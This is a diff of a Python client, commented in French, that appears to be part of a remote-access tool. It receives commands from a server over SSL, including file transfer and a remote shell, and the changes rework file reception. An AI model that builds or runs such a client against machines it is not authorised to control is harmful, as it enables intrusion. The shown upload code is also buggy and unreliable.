@@ -46,8 +46,20 @@ def download(client_socket):
 
 # Fonction permettant de recevoir un fichier du serveur
 def upload(ssl_socket):
-    filename = ssl_socket.recv(4096).decode() # Réception du nom du fichier
-    #ssl_socket.recv(filename.encode())
+    try:
+        command = ssl_socket.recv(4096)
+        if command == b'upload':
+            filename = ssl_socket.recv(4096).decode() # Réception du nom du fichier 
+        with open(filename, 'wb') as f:
+            while True:
+                chunk = ssl_socket.recv(4096)
+                if not chunk:
+                    break
+                f.write(chunk)
+            print(f"Le fichier '{filename} a bien été reçu")
+    except Exception as e:
+        print(f"Erreur lors de la réception du fichier")
+        #ssl_socket.recv(filename.decode())
 
 # Fonction permettant d'accepter un shell depuis le serveur
 def shell(ssl_socket):
@@ -132,7 +144,7 @@ def main():
 
     # Gestion des commandes reçues par le serveur
     while True:
-        command = ssl_socket.recv(1024).decode()
+        command = ssl_socket.recv(4096).decode()
         if command.lower() == 'help':
             menu_help(ssl_socket)
         elif command.lower() == 'download':
